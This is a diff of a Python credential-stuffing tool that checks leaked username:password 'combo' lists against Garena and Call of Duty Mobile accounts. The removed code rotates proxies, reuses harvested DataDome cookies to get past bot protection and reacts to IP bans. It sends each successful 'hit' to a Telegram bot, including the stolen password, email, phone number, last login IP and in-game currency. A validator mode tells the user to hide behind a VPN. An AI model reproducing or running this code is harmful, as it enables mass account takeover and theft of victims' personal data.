-        def wrap(url: str):
-            try:
-                scan(url)
-            finally:
-                discard()
-
-        with ThreadPoolExecutor(max_workers=workers) as executor:
-            futures = [executor.submit(wrap, u) for u in urls]
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception:
-                    pass
-
-    discard()
-
-    pace = whole / max(time.monotonic() - started, 0.001)
-    console.print(
-        f"\n{lead}  [bold green]✔ Valid: {len(alive):,}[/bold green]   "
-        f"[bold red]✖ Dead: {len(dead):,}[/bold red]   "
-        f"[dim]│  ~{pace:.0f}/s[/dim]"
-    )
-
-    mean = (sum(waits) / len(waits)) if waits else -1.0
-    rank(len(alive), whole, mean, lead)
-
-    return alive
-
-def rank(alive_count, whole_count, latency_ms, lead="    "):
-    if not whole_count:
-        return
-
-    rate = (alive_count / whole_count) * 100
-
-    if rate >= 50 and 0 < latency_ms <= 1500:
-        band = "HIGH"
-        col = "bold bright_green"
-        bcol = "bright_green"
-        mark = "🟢"
-        hint = "up to 20"
-        note = "Proxies are fast and reliable. Push thread count high."
-    elif rate >= 30 or (0 < latency_ms <= 2500):
-        band = "MEDIUM"
-        col = "bold yellow"
-        bcol = "yellow"
-        mark = "🟡"
-        hint = "8 – 12"
-        note = "Acceptable pool. Balance threads to avoid timeouts."
-    else:
-        band = "LOW"
-        col = "bold red"
-        bcol = "red"
-        mark = "🔴"
-        hint = "3 – 5"
-        note = "Pool is weak. Low threads reduce wasted retries."
-
-    lat = f"{latency_ms:.0f} ms" if latency_ms > 0 else "N/A"
-    bw = 24
-
-    def stripes(pct, width=bw, color="bright_green"):
-        filled = int(pct / 100 * width)
-        return (
-            f"[{color}]{'█' * filled}[/{color}]"
-            f"[dim]{'░' * (width - filled)}[/dim]"
-        )
-
-    def waits(ms, width=bw):
-        if ms <= 0:
-            return f"[dim]{'░' * width}[/dim]"
-        capped = min(ms, 3000)
-        filled = int(capped / 3000 * width)
-        color = (
-            "bright_green" if ms <= 800
-            else "yellow" if ms <= 1800
-            else "red"
-        )
-        return (
-            f"[{color}]{'█' * filled}[/{color}]"
-            f"[dim]{'░' * (width - filled)}[/dim]"
-        )
-
-    lv = (
-        "[bright_green]Excellent[/bright_green]"
-        if 0 < latency_ms <= 800
-        else "[yellow]Acceptable[/yellow]"
-        if latency_ms <= 1800
-        else "[red]Slow[/red]"
-        if latency_ms > 1800
-        else "[dim]N/A[/dim]"
-    )
-
-    tbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
-    tbl.add_column(style="dim", width=22)
-    tbl.add_column(style="white", width=36)
-
-    tbl.add_row("  Quality Tier", f"[{col}]{mark}  {band}[/{col}]")
-    tbl.add_row("", "")
-    tbl.add_row(
-        "  Success Rate",
-        f"[bold]{rate:.1f}%[/bold]  "
-        f"[dim]({alive_count:,} / {whole_count:,})[/dim]"
-    )
-    tbl.add_row("", stripes(rate, color=bcol))
-    tbl.add_row("", "")
-    tbl.add_row("  Avg Latency", f"[bold]{lat}[/bold]  [dim]{lv}[/dim]")
-    tbl.add_row("", waits(latency_ms))
-    tbl.add_row("", "")
-    tbl.add_row(
-        "  Rec. Threads",
-        f"[bold bright_cyan]{hint}[/bold bright_cyan]"
-    )
-    tbl.add_row("  Advice", f"[dim]{note}[/dim]")
-
-    console.print()
-    console.print(Panel(
-        tbl,
-        title="[bold bright_white] PROXY QUALITY REPORT [/bold bright_white]",
-        subtitle=f"[{col}] {band} TIER [/{col}]",
-        border_style=bcol,
-        padding=(1, 2),
-        expand=False
-    ))
-    console.print()
-
-def batch(style='full'):
-    global bulk, other, harvest, proxies, relay, hook
-
-    bulk = style
-    wipe()
-    banner()
-    vault = Vault()
-    lens = Lens()
-    files = vault.scan()
-
-    if not files:
-        herald('ERROR', "No combo files found in 'Combo' folder. Add .txt files and retry.")
-        input(f'  {dim}Press Enter to return to menu{rst} ')
-        return
-
-    infos = [info for fp in files for info in [vault.probe(fp)] if info]
-    if not infos:
-        herald('ERROR', 'No valid combo files found.')
-        input(f'  {dim}Press Enter to return to menu{rst} ')
-        return
-
-    lens.board(infos)
-    chosen = lens.choose(infos)
-
-    if lens.ask_clean():
-        with console.status(
-            '[bright_cyan]  ↺  Cleaning file encoding…[/bright_cyan]',
-            spinner='dots'
-        ):
-            good, bad = vault.cleanse(chosen)
-        herald(
-            'SUCCESS',
-            f'Cleaned: [bold]{good}[/bold] valid, '
-            f'[bright_red]{bad}[/bright_red] removed'
-        )
-
-    if lens.ask_dedupe():
-        with console.status(
-            '[bright_cyan]  ↺  Removing duplicates…[/bright_cyan]',
-            spinner='dots'
-        ):
-            removed = vault.dedupe(chosen)
-        herald('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')
-
-    auto = lens.ask_auto()
-    if auto:
-        herald('INFO', '[dim]Auto-remove enabled.[/dim]')
-
-    harvest = True
-    herald('SUCCESS', 'Cookie harvesting enabled automatically.', '    ')
-
-    configure()
-    relay_ok = (
-        relay is not None
-        and relay.enabled
-        and len(relay.proxies) > 0
-    )
-    proxies = bool(relay_ok)
-
-    if not relay_ok:
-        herald('INFO', '[dim]Running without proxies (direct connection)[/dim]')
-    else:
-        herald(
-            'SUCCESS',
-            f'[dim]Proxy enabled — {len(relay.proxies)} proxies loaded[/dim]'
-        )
-
-    wipe()
-    banner()
-    accounts = []
-    try:
-        with open(chosen, 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                account, password = pare(line)
-                if account and password:
-                    accounts.append(f'{account}:{password}')
-
-        ftbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
-        ftbl.add_column(style='dim', width=12, no_wrap=True)
-        ftbl.add_column(style='bright_white', no_wrap=True)
-        ftbl.add_row('File', f'[bright_cyan]{Path(chosen).name}[/bright_cyan]')
-        ftbl.add_row(
-            'Accounts',
-            f'[bold bright_white]{len(accounts):,}[/bold bright_white]'
-        )
-        console.print(Panel(
-            ftbl,
-            title='[bold bright_green]✔ FILE LOADED[/bold bright_green]',
-            border_style='bright_magenta',
-            box=card,
-            padding=(0, 2),
-            expand=False,
-            width=60
-        ))
-    except Exception as _e:
-        herald('ERROR', f'Could not load file: {_e}')
-        input(f'  {dim}Press Enter to return to menu{rst} ')
-        return
-
-    if not accounts:
-        herald('ERROR', 'No valid accounts found in file.')
-        print()
-        input(f'  {dim}Press Enter to return to menu{rst} ')
-        return
-
-    itbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
-    itbl.add_column(style='dim', width=16, no_wrap=True)
-    itbl.add_column(style='bright_white', no_wrap=True)
-    itbl.add_row(
-        'Total Queued',
-        f'[bold bright_white]{len(accounts):,}[/bold bright_white]'
-    )
-    itbl.add_row('Status', '[bright_green]Ready[/bright_green]')
-    console.print(Panel(
-        itbl,
-        title='[bold bright_cyan]ℹ ACCOUNT QUEUE[/bold bright_cyan]',
-        border_style='bright_magenta',
-        box=card,
-        padding=(0, 2),
-        expand=False,
-        width=50
-    ))
-
-    scribe = Scribe(chosen)
-    jar = Jar()
-    warden = Warden()
-    stats = Ledger()
-    stats.total = len(accounts)
-
-    if relay_ok:
-        herald('INFO', f'[dim]Using {len(relay.proxies)} proxies[/dim]')
-    else:
-        herald('INFO', '[dim]Direct connection (no proxies)[/dim]')
-    print()
-
-    def _vis(s):
-        return len(re.sub(r"\033\[[0-9;]*m", "", s))
-
-    def _box(color, w_):
-        top = f"  {color}┏{'━' * (w_ + 2)}┓{rst}"
-        div = f"  {color}┣{'━' * (w_ + 2)}┫{rst}"
-        bot = f"  {color}┗{'━' * (w_ + 2)}┛{rst}"
-        return top, div, bot
-
-    def _line(color, content, w_):
-        gap = w_ - _vis(content)
-        return (
-            f"  {color}┃{rst} {content}"
-            f"{' ' * max(gap, 0)} {color}┃{rst}"
-        )
-
-    ceiling = 100 if relay_ok else 30
-
-    if relay_ok:
-        wid = 56
-        top, div, bot = _box(cy, wid)
-        print(top)
-        print(_line(cy, f"{brt}{wh}⧫  THREAD SELECTOR{rst}", wid))
-        print(div)
-        print(_line(cy, f"{gn}5–15{rst}    {dim}Safe{rst}  {dim}(recommended){rst}", wid))
-        print(_line(cy, f"{yl}17–19{rst}   {dim}Medium speed{rst}", wid))
-        print(_line(cy, f"{cy}23–30{rst}  {dim}Fast — proxy only{rst}", wid))
-        print(bot)
-        print()
-
-        while True:
-            try:
-                raw = input(
-                    f"  {cy}❯{rst} Threads 1-{ceiling} "
-                    f"{dim}(default {default}){rst} {cy}❯{rst} "
-                ).strip()
-                hands = default if not raw else int(raw)
-                if 1 <= hands <= ceiling:
-                    break
-                herald("ERROR", f"Enter a value between 1 and {ceiling}.")
-            except ValueError:
-                herald("ERROR", "Invalid input — enter a number.")
-
-        herald("SUCCESS", f"Running with {brt}{hands}{rst} thread(s)")
-        print()
-    else:
-        hands = 30
-        wid = 60
-        top, div, bot = _box(yl, wid)
-        print(top)
-        print(_line(yl, f"{brt}{wh}⚠  NO PROXY DETECTED{rst}", wid))
-        print(div)
-        print(_line(
-            yl,
-            f" {dim}Auto-locking to {rst}{brt}{gn}30 THREADS{rst}"
-            f"{dim} for stable checking.{rst}",
-            wid
-        ))
-        print(_line(
-            yl,
-            f" {dim}Direct IP is prone to rate limits and bans.{rst}",
-            wid
-        ))
-        print(_line(
-            yl,
-            f" {dim}To unlock 100 threads, configure a proxy pool.{rst}",
-            wid
-        ))
-        print(bot)
-        print()
-        herald(
-            "SUCCESS",
-            f"Running with {brt}{hands}{rst} thread(s) {dim}(Direct IP){rst}"
-        )
-        print()
-
-    wid_g = 60
-    top_g, div_g, bot_g = _box(mg, wid_g)
-    print(top_g)
-    print(_line(mg, f"{brt}{wh}◇  GAME CONNECTIONS{rst}", wid_g))
-    print(div_g)
-    print(_line(
-        mg,
-        f"{wh}Check OTHER GAMES{rst}  {dim}(AOV / ROV / FF / Delta Force…){rst}",
-        wid_g
-    ))
-    print(_line(
-        mg,
-        f"{dim}Saves each game to separate file  ·  Adds ~1-3s per account{rst}",
-        wid_g
-    ))
-    print(bot_g)
-    print()
-
-    other = input(
-        f"  {mg}◇{rst}  Check other games? (y/N) {cy}❯{rst} "
-    ).strip().lower() == "y"
-    if other:
-        herald("SUCCESS", "Will scan all Garena game connections")
-    else:
-        herald("INFO", f"{dim}CODM only — skipping other game checks{rst}")
-    print()
-
-    cfgfile = os.path.join(scrpath, '.tg_cfg')
-
-    def _save(token, chat, mode, clean_range, nc_range):
-        try:
-            with open(cfgfile, 'w', encoding='utf-8') as f:
-                json.dump({
-                    'token': token,
-                    'chat_id': chat,
-                    'mode': mode,
-                    'clean': clean_range,
-                    'nc': nc_range
-                }, f)
-        except Exception:
-            pass
-
-    def _load():
-        try:
-            if not os.path.exists(cfgfile):
-                return None
-            with open(cfgfile, 'r', encoding='utf-8') as f:
-                d = json.load(f)
-            if d.get('token') and d.get('chat_id'):
-                return d
-            return None
-        except Exception:
-            return None
-
-    saved = _load()
-    wid_t = 56
-    top_t, div_t, bot_t = _box(yl, wid_t)
-    print(top_t)
-    print(_line(yl, f"{brt}{wh}⬡  TELEGRAM NOTIFICATION SETUP{rst}", wid_t))
-    print(div_t)
-    print(_line(yl, f"{wh}1{rst}  {yl}›{rst}  {dim}Send Clean hits only{rst}", wid_t))
-    print(_line(yl, f"{wh}2{rst}  {yl}›{rst}  {dim}Send Not-Clean hits only{rst}", wid_t))
-    print(_line(yl, f"{wh}3{rst}  {yl}›{rst}  {dim}Send Both (clean + not-clean){rst}", wid_t))
-    print(_line(yl, f"{wh}4{rst}  {dim}›  No Telegram (skip){rst}", wid_t))
-    print(bot_t)
-    print()
-
-    tg_pick = ''
-    while tg_pick not in ('1', '2', '3', '4'):
-        tg_pick = input(f'  {yl}❯{rst} ').strip()
-
-    tg_on = tg_pick != '4'
-    tg_clean = tg_pick in ('1', '3')
-    tg_nc = tg_pick in ('2', '3')
-    bot_token = ''
-    chat_id = ''
-    lmin_c = lmax_c = 0
-    lmin_n = lmax_n = 0
-    lmax_c = lmax_n = 9999
-
-    if tg_on:
-        print()
-        if saved:
-            wid_s = 56
-            top_s, div_s, bot_s = _box(gn, wid_s)
-            print(top_s)
-            print(_line(gn, f"{brt}{wh}✔  Saved config found{rst}", wid_s))
-            print(div_s)
-            print(_line(gn, f"{dim}Token: {saved['token']}{rst}", wid_s))
-            print(_line(gn, f"{dim}Chat ID: {saved['chat_id']}{rst}", wid_s))
-            print(bot_s)
-            print()
-            if input(
-                f'  {yl}❯ Use saved config? (y/n){rst}  {yl}❯{rst} '
-            ).strip().lower() == 'y':
-                bot_token = saved['token']
-                chat_id = saved['chat_id']
-                _cr = saved.get('clean', [0, 9999])
-                _nr = saved.get('nc', [0, 9999])
-                lmin_c, lmax_c = (_cr[0], _cr[1]) if tg_clean else (0, 9999)
-                lmin_n, lmax_n = (_nr[0], _nr[1]) if tg_nc else (0, 9999)
-                wid_ok = 56
-                top_ok, _, bot_ok = _box(gn, wid_ok)
-                print(top_ok)
-                print(_line(gn, f"{brt}{wh}✔  Using saved config{rst}", wid_ok))
-                print(bot_ok)
-                print()
-            else:
-                saved = None
-
-        if not saved:
-            wid_i = 56
-            top_i, _, bot_i = _box(yl, wid_i)
-            print(top_i)
-            print(_line(yl, f"{brt}{wh}Enter Telegram Credentials{rst}", wid_i))
-            print(bot_i)
-            print()
-            bot_token = input(f'  {yl}❯ Bot Token{rst}  {yl}❯{rst} ').strip()
-            chat_id = input(f'  {yl}❯ Chat ID{rst}  {yl}❯{rst} ').strip()
-
-            if tg_clean:
-                print()
-                print(
-                    f'  {dim}Level range for {gn}CLEAN{rst}'
-                    f'{dim} hits — format: min-max (e.g. 50-400){rst}'
-                )
-                raw_c = input(
-                    f'  {gn}❯ Clean level range (Enter = all){rst}  '
-                    f'{gn}❯{rst} '
-                ).strip()
-                if raw_c and '-' in raw_c:
-                    try:
-                        parts = raw_c.split('-')
-                        lmin_c = int(parts[0].strip())
-                        lmax_c = int(parts[1].strip())
-                    except Exception:
-                        pass
-
-            if tg_nc:
-                print()
-                print(
-                    f'  {dim}Level range for {rd}NOT-CLEAN{rst}'
-                    f'{dim} hits — format: min-max (e.g. 1-200){rst}'
-                )
-                raw_n = input(
-                    f'  {rd}❯ Not-clean level range (Enter = all){rst}  '
-                    f'{rd}❯{rst} '
-                ).strip()
-                if raw_n and '-' in raw_n:
-                    try:
-                        parts = raw_n.split('-')
-                        lmin_n = int(parts[0].strip())
-                        lmax_n = int(parts[1].strip())
-                    except Exception:
-                        pass
-
-            if bot_token and chat_id:
-                _save(
-                    bot_token,
-                    chat_id,
-                    tg_pick,
-                    [lmin_c, lmax_c],
-                    [lmin_n, lmax_n]
-                )
-                print(f'  {dim}Config saved for next time.{rst}')
-
-        print()
-        print(f'  {gn}✔  Telegram configured.{rst}')
-        if tg_clean:
-            print(f'  {dim}Clean hits  : Level {gn}{lmin_c}–{lmax_c}{rst}')
-        if tg_nc:
-            print(f'  {dim}Not-clean   : Level {rd}{lmin_n}–{lmax_n}{rst}')
-        print()
-
-    def _send(token, chat, text, silent=False):
-        try:
-            html = f'<pre><code>{text}</code></pre>'
-            payload = {
-                'chat_id': chat,
-                'text': html,
-                'parse_mode': 'HTML',
-                'disable_notification': silent
-            }
-            requests.post(
-                f'https://api.telegram.org/bot{token}/sendMessage',
-                json=payload,
-                timeout=8
-            )
-        except Exception:
-            pass
-
-    def _build(acc, pwd, ad, clean_hit):
-        lvl = ad.get('codm_level', 0)
-        region = ad.get('codm_region', 'N/A')
-        nick = ad.get('codm_nickname', 'N/A')
-        uid = ad.get('uid', 'N/A')
-        country = ad.get('country', 'N/A')
-        fb = ad.get('fb_info', 'N/A')
-        fb_link = ad.get('fb_link', 'N/A')
-        fb_user = ad.get('fb_username', 'N/A')
-        shell = ad.get('shell_balance', 0)
-        email_d = ad.get('email_display', 'N/A')
-        mobile = ad.get('formatted_mobile', 'N/A')
-        login_d = ad.get('last_login_date', 'N/A')
-        login_w = ad.get('last_login_where', 'N/A')
-        login_ip = ad.get('last_login_ip', 'N/A')
-        login_c = ad.get('last_login_country', 'N/A')
-        username = ad.get('username', 'N/A')
-        bind = ad.get('bind_status', 'N/A')
-        gcs = ad.get('game_connections', [])
-
-        status_text = 'CLEAN' if clean_hit else 'NOT CLEAN'
-        checked_time = ad.get('checked_time', datetime.now().strftime('%B %d, %Y | %I:%M %p'))
-
-        if fb != 'NOT CONNECTED' and not fb:
-            fb = 'CONNECTED'
-
-        lines = [
-            '[  ᴄᴏᴅᴍ ʜɪᴛ  ]',
-            '━━ .✦·········━━━━',
-            f'✦ ꜱᴛᴀᴛᴜꜱ › {status_text}',
-            f'✦ ʟᴇᴠᴇʟ  › {lvl}',
-            f'✦ ꜱʜᴇʟʟꜱ › {shell:,}',
-            '━━ .✦·········━━━━',
-            f'✦ ʟᴏɢɪɴ  › {acc}',
-            f'✦ ᴘᴀꜱꜱ   › {pwd}',
-            '━━ .✦·········━━━━',
-            f'✦ ɴɪᴄᴋ   › {nick}',
-            f'✦ ᴜɪᴅ    › {uid}',
-            f'✦ ʀᴇɢɪᴏɴ › {region}',
-            '━━ .✦·········━━━━',
-            f'✦ ᴜꜱᴇʀ   › {username}',
-            f'✦ ᴇᴍᴀɪʟ  › {email_d}',
-            f'✦ ᴍᴏʙɪʟᴇ › {mobile}',
-            f'✦ ꜰᴀᴄᴇʙᴏᴏᴋ › {fb}',
-            f'✦ ꜰʙ ɴᴀᴍᴇ › {fb_user}'
-        ]
-        if fb_link != 'N/A':
-            lines.append(f'✦ ꜰʙ ʟɪɴᴋ › {fb_link}')
-
-        lines.extend([
-            '━━ .✦·········━━━━',
-            f'✦ ʙɪɴᴅ   › {bind}',
-            f'✦ ᴄᴏᴜɴᴛʀʏ › {country}',
-            '━━ .✦·········━━━━',
-            f'✦ ʟᴀꜱᴛ ʟᴏɢɪɴ › {login_d}',
-            f'✦ ʟᴏɢɪɴ ᴠɪᴀ  › {login_w}',
-            f'✦ ʟᴏɢɪɴ ɪᴘ   › {login_ip}',
-            f'✦ ʟᴏɢɪɴ ʟᴏᴄ  › {login_c}'
-        ])
-
-        if gcs and other:
-            lines.append('━━ .✦·········━━━━')
-            lines.append('✦ ɢᴀᴍᴇꜱ ›')
-            for g in gcs:
-                gname = g.get('game', 'Unknown')
-                role = g.get('role', 'N/A')
-                reg = g.get('region', '')
-                if reg:
-                    lines.append(f'  • {gname}: {role} ({reg})')
-                else:
-                    lines.append(f'  • {gname}: {role}')
-
-        lines.extend([
-            '━━ .✦·········━━━━',
-            f'✦ ᴛɪᴍᴇ   › {checked_time}',
-            '✦ ᴘᴏᴡᴇʀᴇᴅ ʙʏ @rriellqt'
-        ])
-        return '\n'.join(lines)
-
-    def _maybe(account_data):
-        if account_data.get('is_error') or not account_data.get('has_codm'):
-            return
-        is_clean = account_data.get('is_clean', False)
-        lvl = account_data.get('codm_level', 0)
-        acc = account_data.get('account', '')
-        pwd = account_data.get('password', '')
-        msg = _build(acc, pwd, account_data, is_clean)
-        if tg_on:
-            if is_clean and tg_clean and (lmin_c <= lvl <= lmax_c):
-                threading.Thread(
-                    target=_send,
-                    args=(bot_token, chat_id, msg, False),
-                    daemon=True
-                ).start()
-            elif (
-                not is_clean
-                and tg_nc
-                and (lmin_n <= lvl <= lmax_n)
-            ):
-                threading.Thread(
-                    target=_send,
-                    args=(bot_token, chat_id, msg, False),
-                    daemon=True
-                ).start()
-
-    hook = _maybe
-
-    wipe()
-    deck = Deck(len(accounts), max_threads=hands)
-    deck.proxy_mode = relay_ok
-    globals()['_dashboard_ref'] = deck
-    deck.start()
-
-    overall = 0
-    counter = [0]
-    idxlock = threading.Lock()
-    statlock = threading.Lock()
-
-    global ipsilent, ipcallback
-    ipsilent = True
-
-    def _ip_cb(blocked):
-        try:
-            deck.set_ip_blocked(blocked)
-        except Exception:
-            pass
-
-    ipcallback = _ip_cb
-    threadlocal = threading.local()
-
-    def _resources():
-        if not hasattr(threadlocal, 'session') or not hasattr(threadlocal, 'datadome'):
-            threadlocal.session = forge()
-            threadlocal.datadome = Warden()
-            threadlocal.proxy_url = None
-            threadlocal.proxy_line = None
-            if relay_ok and relay and relay.enabled:
-                p = relay.next()
-                if p:
-                    threadlocal.session.proxies.update(p)
-                    threadlocal.proxy_url = p.get('http') or p.get('https')
-                    threadlocal.proxy_line = relay._index
-                    deck.set_current_proxy(
-                        proxy=threadlocal.proxy_url,
-                        line=threadlocal.proxy_line
-                    )
-            proxy_dict = (
-                dict(threadlocal.session.proxies)
-                if relay_ok and relay and relay.enabled
-                else None
-            )
-            saved_ck = jar.pick()
-            if saved_ck:
-                instill(threadlocal.session, saved_ck)
-                dd = pluck(saved_ck)
-                if dd:
-                    threadlocal.datadome.set_datadome(dd)
-                    threadlocal.datadome.set_session_datadome(
-                        threadlocal.session, dd
-                    )
-            else:
-                dd = garner(threadlocal.session, proxies_arg=proxy_dict)
-                if dd:
-                    threadlocal.datadome.set_datadome(dd)
-                    threadlocal.datadome.set_session_datadome(
-                        threadlocal.session, dd
-                    )
-        return (threadlocal.session, threadlocal.datadome)
-
-    def _worker(line):
-        if ':' not in line:
-            return ('DONE', line, {})
-        try:
-            account, password = line.split(':', 1)
-            account, password = account.strip(), password.strip()
-            session, wdm = _resources()
-            quiet = (bulk != 'full')
-            status = process(
-                session, account, password, jar, wdm,
-                stats, scribe, vault, chosen, auto,
-                suppress_print=quiet,
-                proxy_manager=relay if relay_ok else None
-            )
-            return (status, account, {})
-        except Exception:
-            return ('ERROR', line, {})
-
-    def _wrapped(line):
-        nonlocal overall
-        with idxlock:
-            counter[0] += 1
-            my_idx = counter[0]
-        name = line.split(':', 1)[0].strip() if ':' in line else line
-        try:
-            deck.record_start(my_idx, name)
-        except Exception:
-            pass
-
-        while True:
-            status, name, _ = _worker(line)
-            if status == 'IP_CHANGED':
-                if hasattr(threadlocal, 'session'):
-                    try:
-                        threadlocal.session.close()
-                    except Exception:
-                        pass
-                    del threadlocal.session
-                if hasattr(threadlocal, 'datadome'):
-                    del threadlocal.datadome
-                if relay_ok and relay and relay.enabled:
-                    p = relay.next()
-                    if p:
-                        purl = p.get('http') or p.get('https')
-                        pline = relay._index
-                        deck.set_current_proxy(proxy=purl, line=pline)
-                time.sleep(2)
-                continue
-            break
-
-        info = stats.pop()
-        if info and info['success']:
-            shell_b = info.get('shell_balance', 0)
-            deck.record(
-                my_idx, name,
-                success=True,
-                is_clean=info['is_clean'],
-                has_codm=info['has_codm'],
-                codm_level=info['codm_level'],
-                shell_balance=shell_b
-            )
-        else:
-            reason = (info or {}).get('error_reason', 'Invalid')
-            deck.record(
-                my_idx, name,
-                success=False,
-                error_reason=reason
-            )
-
-        with statlock:
-            overall += 1
-
-    try:
-        with ThreadPoolExecutor(max_workers=hands) as executor:
-            futures = {executor.submit(_wrapped, ln): ln for ln in accounts}
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception:
-                    with statlock:
-                        overall += 1
-    except KeyboardInterrupt:
-        herald('WARNING', 'Interrupted — shutting down...')
-    finally:
-        deck.stop()
-
-    ipsilent = False
-    ipcallback = None
-    print()
-    stats.finish()
-    flush(vault, chosen, force=True)
-    print(f'  {dim}Results saved in real-time to Results/{rst}')
-    print()
-    input(f'  {dim}Press Enter to return to menu{rst} ')
-
-def solo():
-    global other, proxies, relay, ipsilent
-
-    wipe()
-    banner()
-    jar = Jar()
-    warden = Warden()
-    proxies = False
-    relay = None
+def proxy_diagnostic():
+    clear_screen()
+    display_banner()
+    console = Console()
 
     console.print(Panel(
-        Text("SINGLE CHECK", style="bold bright_white"),
-        border_style="bright_magenta",
-        box=box.ROUNDED,
-        expand=False
-    ))
-    print()
-
-    while True:
-        other = input(
-            f'  {cy}◇{rst}  Check game connections? (y/N) {cy}❯{rst} '
-        ).strip().lower() == "y"
-
-        if other:
-            herald('INFO', '[dim]Will scan all Garena game connections[/dim]')
-        else:
-            herald('INFO', '[dim]CODM only — skipping other game checks[/dim]')
-
-        print()
-
-        stats = Ledger()
-        stats.total = 1
-
-        session = forge()
-        jar = Jar()
-        warden = Warden()
-
-        saved_ck = jar.pick()
-        if saved_ck:
-            instill(session, saved_ck)
-            dd = pluck(saved_ck)
-            if dd:
-                warden.set_datadome(dd)
-                warden.set_session_datadome(session, dd)
-        else:
-            proxy_dict = (
-                dict(session.proxies)
-                if hasattr(session, 'proxies') and session.proxies
-                else None
-            )
-            dd = garner(session, proxies_arg=proxy_dict)
-            if dd:
-                warden.set_datadome(dd)
-                warden.set_session_datadome(session, dd)
-
-        account = input(
-            f'  {cy}❯ Username/Email{rst}  {cy}❯{rst} '
-        ).strip()
-        if not account:
-            herald('ERROR', 'Username/Email cannot be empty.')
-            print()
-            continue
-
-        password = input(
-            f'  {cy}❯ Password{rst}  {cy}❯{rst} '
-        ).strip()
-        if not password:
-            herald('ERROR', 'Password cannot be empty.')
-            print()
-            continue
-
-        stamp_v = datetime.now().strftime('%Y%m%d_%H%M%S')
-        scribe = Scribe(combo_file_path=Path('SingleCheck'), create_dirs=False)
-        scribe.base_dir = Path(f'Single Check Output/{stamp_v}')
-
-        if other:
-            (scribe.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
-
-        herald(
-            'INFO',
-            f'[dim]Checking: [bold bright_cyan]{account}[/bold bright_cyan]…[/dim]'
-        )
-        print()
-
-        process(
-            session,
-            account,
-            password,
-            jar,
-            warden,
-            stats,
-            scribe,
-            vault=None,
-            combo_file_path=None,
-            auto_remove=False,
-            use_elegant_display=True,
-            suppress_print=False
-        )
-
-        console.print(Panel(
-            Text("SAVE RESULT?", style="bold bright_white") + Text(" (y/n)", style="dim"),
-            border_style="bright_yellow",
-            box=box.ROUNDED,
-            expand=False
-        ))
-        save_resp = input(f'\n  {yl}❯{rst} ').strip().lower()
-
-        if save_resp == 'y':
-            for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
-                (scribe.base_dir / sub).mkdir(parents=True, exist_ok=True)
-            herald(
-                'SAVE',
-                f'Saved to [bright_cyan]{scribe.base_dir}[/bright_cyan]'
-            )
-        else:
-            herald('INFO', '[dim]Result discarded — not saved.[/dim]')
-
-        console.print(Panel(
-            Text("CHECK ANOTHER?", style="bold bright_white") + Text(" (y/n)", style="dim"),
-            border_style="bright_magenta",
-            box=box.ROUNDED,
-            expand=False
-        ))
-        again = input(f'\n  {mg}❯{rst} ').strip().lower()
-
-        if again != 'y':
-            break
-
-        session.close()
-        herald('INFO', '[dim]↺  Refreshing session for next check…[/dim]')
-        time.sleep(1)
-        wipe()
-        banner()
-        console.print(Panel(
-            Text("SINGLE ACCOUNT CHECK", style="bold bright_white"),
-            border_style="bright_magenta",
-            box=box.ROUNDED,
-            expand=False
-        ))
-        print()
-
-def audit():
-    wipe()
-    banner()
-    console.print(Panel(
-        Text("⚠  SECURITY NOTICE", style="bold bright_red")
-        + Text(" — USE A VPN BEFORE VALIDATING", style="bright_white"),
-        border_style="bright_red",
-        box=box.ROUNDED,
-        expand=False
-    ))
-    print()
-    console.print(Panel(
-        Text("⬡  VALIDATOR MODE", style="bold bright_white"),
-        border_style="bright_yellow",
-        box=box.ROUNDED,
-        expand=False
-    ))
-    print()
-
-    vault = Vault()
-    files = vault.scan()
-    if not files:
-        herald('ERROR', 'No .txt files found in Combo folder.')
-        input(f'\n  {dim}Press Enter to return to menu{rst} ')
-        return
-
-    lens = Lens()
-    infos = [info for fp in files for info in [vault.probe(fp)] if info]
-    if not infos:
-        herald('ERROR', 'No valid combo files.')
-        input(f'\n  {dim}Press Enter to return to menu{rst} ')
-        return
-
-    lens.board(infos)
-    chosen = lens.choose(infos)
-
-    accounts = []
-    with open(chosen, 'r', encoding='utf-8', errors='ignore') as f:
-        for line in f:
-            acc, pw = pare(line)
-            if acc and pw:
-                accounts.append((acc, pw))
-
-    if not accounts:
-        herald('ERROR', 'No valid account:password lines found.')
-        input(f'\n  {dim}Press Enter to return to menu{rst} ')
-        return
-
-    console.print(Panel(
-        Text(f"Loaded {len(accounts):,} combos", style="bold bright_white"),
-        border_style="bright_green",
-        box=box.ROUNDED,
-        expand=False
-    ))
-    print()
-
-    console.print(Panel(
-        Text("Select Thread Count", style="bold bright_white"),
-        border_style="bright_cyan",
-        box=box.ROUNDED,
-        expand=False
-    ))
-
-    while True:
-        try:
-            raw_t = input(
-                f'  {cy}❯ Threads 1-20 {dim}(default {default}){rst}  '
-                f'{cy}❯{rst} '
-            ).strip()
-            hands = int(raw_t) if raw_t else default
-            if 1 <= hands <= 20:
-                break
-            herald('ERROR', 'Enter a value between 1 and 20.')
-        except ValueError:
-            herald('ERROR', 'Invalid input — enter a number.')
-
-    herald('SUCCESS', f'Running with [bold]{hands}[/bold] thread(s)')
-    print()
-
-    stem = Path(chosen).stem
-    stamp_v = datetime.now().strftime('%Y%m%d_%H%M%S')
-    outdir = Path('Results') / f'validator_{stem}_{stamp_v}'
-    outdir.mkdir(parents=True, exist_ok=True)
-
-    good_path = outdir / 'valid.txt'
-    bad_path = outdir / 'invalid.txt'
-    err_path = outdir / 'errors.txt'
-
-    good_fh = open(good_path, 'a', encoding='utf-8', buffering=1)
-    bad_fh = open(bad_path, 'a', encoding='utf-8', buffering=1)
-    err_fh = open(err_path, 'a', encoding='utf-8', buffering=1)
-
-    v = {'valid': 0, 'invalid': 0, 'error': 0, 'done': 0}
-    stlock = threading.Lock()
-    flock = threading.Lock()
-    stopev = threading.Event()
-    plock = threading.Lock()
-    started = time.time()
-    total = len(accounts)
-    jar_v = Jar()
-    tloc = threading.local()
-
-    def _sess():
-        if not hasattr(tloc, 's'):
-            s = forge()
-            dm = Warden()
-            saved = jar_v.pick()
-            if saved:
-                instill(s, saved)
-                dd = pluck(saved)
-                if dd:
-                    dm.set_datadome(dd)
-                    dm.set_session_datadome(s, dd)
-            else:
-                pdict = (
